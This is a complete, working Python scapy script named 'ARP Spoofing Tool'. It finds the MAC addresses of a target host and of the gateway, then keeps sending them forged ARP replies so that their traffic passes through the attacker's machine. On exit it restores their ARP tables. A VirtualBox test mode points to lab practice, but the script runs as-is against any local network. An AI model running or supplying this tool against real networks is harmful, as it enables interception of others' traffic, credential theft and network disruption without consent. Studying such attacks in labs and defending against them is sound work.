#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys
import argparse

def get_mac(ip, interface):
    """Retrieve the MAC address of an IP"""
    print(f"[*] Looking for MAC of {ip}...")
    
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    try:
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, 
                                 iface=interface, verbose=False)[0]
        
        if answered_list:
            mac = answered_list[0][1].hwsrc
            print(f"[✓] MAC found: {mac}")
            return mac
        else:
            print(f"[!] No response from {ip}")
            print("[!] Check:")
            print(f"    - Is the IP {ip} correct?")
            print(f"    - Is the machine turned on?")
            print(f"    - Are you on the same network?")
            return None
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def spoof(target_ip, spoof_ip, target_mac, interface):
    """Send a spoofed ARP packet"""
    if target_mac is None:
        return False
    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False, iface=interface)
    return True

def restore(destination_ip, source_ip, interface):
    """Restore ARP tables"""
    print(f"[*] Restoring: {destination_ip}")
    
    dest_mac = get_mac(destination_ip, interface)
    src_mac = get_mac(source_ip, interface)
    
    if dest_mac and src_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac,
                          psrc=source_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=False, iface=interface)
        return True
    return False

def main():
    # Configuration with command line arguments
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("interface", help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument("target_ip", help="Target IP address to spoof")
    parser.add_argument("gateway_ip", help="Gateway/Router IP address")
    parser.add_argument("-t", "--test-mode", action="store_true", 
                       help="Test mode with default VirtualBox IPs")
    
    args = parser.parse_args()
    
    # If test mode is enabled, use default IPs for testing
    if args.test_mode:
        print("[*] TEST MODE: Using default VirtualBox IPs")
        target_ip = "192.168.74.220"
        gateway_ip = "192.168.74.9"
    else:
        target_ip = args.target_ip
        gateway_ip = args.gateway_ip
    
    print(f"[*] Configuration:")
    print(f"    Interface: {args.interface}")
    print(f"    Target: {target_ip}")
    print(f"    Gateway: {gateway_ip}")
    print("\n[*] Finding MAC addresses...")
    
    # Find MAC addresses
    target_mac = get_mac(target_ip, args.interface)
    gateway_mac = get_mac(gateway_ip, args.interface)
    
    if not target_mac or not gateway_mac:
        print("\n[!] ERROR: Unable to find MAC addresses!")
        print("[*] Try these commands to verify:")
        print(f"    ping {target_ip}")
        print(f"    arp -a")
        print(f"    ip neigh show")
        sys.exit(1)
    
    # Start the attack
    print(f"\n[*] Starting ARP spoofing attack...")
    print("[*] Press Ctrl+C to stop")
    
    packet_sent_count = 0
    try:
        while True:
            if spoof(target_ip, gateway_ip, target_mac, args.interface):
                packet_sent_count += 1
            if spoof(gateway_ip, target_ip, gateway_mac, args.interface):
                packet_sent_count += 1
            
            print(f"\r[*] Packets sent: {packet_sent_count}", end="")
            sys.stdout.flush()
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n\n[*] Stopping...")
        restore(target_ip, gateway_ip, args.interface)
        restore(gateway_ip, target_ip, args.interface)
        print("[✓] ARP tables restored")

if __name__ == "__main__":
    # Check for sudo/root privileges
    import os
    if os.geteuid() != 0:
        print("[!] Run with: sudo python3 arpspoof.py <interface> <target_ip> <gateway_ip>")
        print("[!] Examples:")
        print("    sudo python3 arpspoof.py eth0 192.168.1.100 192.168.1.1")
        print("    sudo python3 arpspoof.py wlan0 10.0.2.15 10.0.2.2")
        sys.exit(1)
    
    if len(sys.argv) < 4:
        print("[!] Usage: sudo python3 arpspoof.py <interface> <target_ip> <gateway_ip>")
        print("[!] Examples:")
        print("    sudo python3 arpspoof.py eth0 192.168.1.100 192.168.1.1")
        print("    sudo python3 arpspoof.py wlan0 10.0.2.15 10.0.2.2")
        print("\n[*] Test mode (for VirtualBox):")
        print("    sudo python3 arpspoof.py eth0 dummy dummy -t")
        sys.exit(1)
    
    main()